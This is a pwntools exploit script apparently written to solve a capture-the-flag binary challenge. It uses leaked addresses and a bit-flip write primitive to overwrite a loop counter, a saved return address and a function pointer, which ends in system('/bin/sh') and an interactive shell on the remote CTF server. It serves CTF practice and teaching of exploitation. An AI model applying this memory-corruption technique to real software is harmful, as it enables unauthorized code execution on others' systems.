from pwn import*
context.arch="amd64"
context.terminal="xterm" #adjust this with ur terminal
b="./main"
#l = libc = ELF("./libc.so.6")
elf = e = context.binary = ELF(b)
DEBUG=0 # 0 remote , 1 local , 2 local + gdb
nc="nc ctf.taz.tn 10011"
r=nc.split(" ")
if DEBUG==1:
    p=process(b)
elif DEBUG==2:
    p=process(b)
    gdb.attach(p,""" b* bit_flip+85
    b* win
    """)
else:
    p=remote(r[1],int(r[2]),ssl=False)

p.recvuntil(b"&vuln = ")
e.address = int(p.recvline()[:-1],16) - e.sym.vuln
p.recvuntil(b"&system = ")
system = int(p.recvline()[:-1],16) 
p.recvuntil(b"&address = ")
stack = int(p.recvline()[:-1],16)

print(f"binary : {hex(e.address)}")
print(f"system : {hex(system)}")
print(f"stack : {hex(stack)}")

i_addr=stack-1
p.sendlineafter(b">",hex(i_addr).encode())
p.sendline(b"7") #  overwriting i with big number  (negative number) so we get infinite bit flips

#return address

p.sendlineafter(b">",hex(stack+0x18).encode())
p.sendline(b"3") #overwrite saved ret addr with win  @

def bit_flip_from_zero(address,value):
    value_bits=bin(value)[2::]
    value_bits=value_bits[::-1]
    print(value_bits)
    for i in range(len(value_bits)):
        if value_bits[i]=="1":
            print(f"writing 1<<{i%8} to {hex(address)}")
            p.sendlineafter(b">",hex(address+(i//8)).encode())
            p.sendline(f"{i%8}".encode())

bit_flip_from_zero(e.sym.f,system) # writing system @ into f
bit_flip_from_zero(e.sym.string,0x5f7373656c657375) # bit flip to zero * xD (x^x = 0)
bit_flip_from_zero(e.sym.string,u64(b"/bin/sh\x00")) #writing bin sh into string

p.sendlineafter(b">",hex(i_addr).encode())
p.sendline(b"7")# reseting i to small number


p.interactive()